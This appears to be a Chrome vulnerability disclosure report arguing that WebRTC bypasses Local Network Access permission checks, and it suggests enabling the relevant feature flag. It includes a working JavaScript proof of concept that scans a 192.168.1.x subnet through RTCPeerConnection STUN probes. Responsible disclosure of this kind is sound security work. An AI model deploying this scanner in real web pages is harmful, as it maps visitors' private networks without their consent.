# Chrome VRP Report: WebRTC Bypasses Local Network Access Checks

## Summary

Chrome's Local Network Access (LNA) checks are ENABLED for Fetch/XHR, WebSockets, and WebTransport, but DISABLED for WebRTC (`kLocalNetworkAccessChecksWebRTC`). This creates an inconsistency where public websites can use WebRTC to probe local/private network devices without any permission prompt.

## Vulnerability Details

**Component:** `services/network/public/cpp/features.cc`

```cpp
// LNA checks enabled for other protocols:
BASE_FEATURE(kLocalNetworkAccessChecks, base::FEATURE_ENABLED_BY_DEFAULT);
BASE_FEATURE(kLocalNetworkAccessChecksWebSockets, base::FEATURE_ENABLED_BY_DEFAULT);
BASE_FEATURE(kLocalNetworkAccessChecksWebTransport, base::FEATURE_ENABLED_BY_DEFAULT);

// LNA checks DISABLED for WebRTC:
BASE_FEATURE(kLocalNetworkAccessChecksWebRTC, base::FEATURE_DISABLED_BY_DEFAULT);
```

Additionally, CSP `connect-src` does not restrict `RTCPeerConnection`, providing no fallback protection.

## Steps to Reproduce

```html
<script>
async function scanLocalNetwork() {
    for (let i = 1; i <= 254; i++) {
        const ip = `192.168.1.${i}`;
        const pc = new RTCPeerConnection({
            iceServers: [{urls: `stun:${ip}:3478`}]
        });
        const dc = pc.createDataChannel('probe');
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        
        pc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate.includes(ip)) {
                console.log(`Host found: ${ip}`);
            }
        };
        setTimeout(() => pc.close(), 2000);
    }
}
scanLocalNetwork();
</script>
```

### Expected Behavior

WebRTC connections to local network addresses should trigger LNA permission checks.

### Actual Behavior

WebRTC connections to local network addresses proceed without any LNA check.

## Impact

1. **Local Network Scanning**: Any website can enumerate live hosts on the local network
2. **No User Consent**: Unlike Fetch/WebSocket/WebTransport, no permission prompt
3. **Inconsistent Enforcement**: WebRTC is the last remaining unchecked protocol

## Severity Assessment

**Medium-High** — No compromised renderer required. WebRTC is the obvious bypass route when all other protocols enforce LNA.

## Suggested Fix

Enable `kLocalNetworkAccessChecksWebRTC` by default.
